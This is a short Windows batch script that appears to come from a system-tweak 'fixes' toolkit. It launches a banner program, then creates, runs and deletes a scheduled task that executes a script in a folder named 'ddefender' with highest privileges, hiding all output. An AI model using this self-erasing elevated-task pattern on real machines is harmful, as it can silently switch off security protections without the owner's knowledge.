@echo off
if exist %SYSTEMDRIVE%\fixes\banner.exe ( start "" /b %SYSTEMDRIVE%\fixes\banner.exe )
schtasks /delete /tn cmd_a /f >nul 2>&1
schtasks /create /sc once /tn cmd_a /tr %SYSTEMDRIVE%\fixes\ddefender\run.cmd /rl highest /sd 01/01/2000 /st 00:00 >nul 2>&1
schtasks /run /tn cmd_a >nul 2>&1 && schtasks /delete /tn cmd_a /f >nul 2>&1
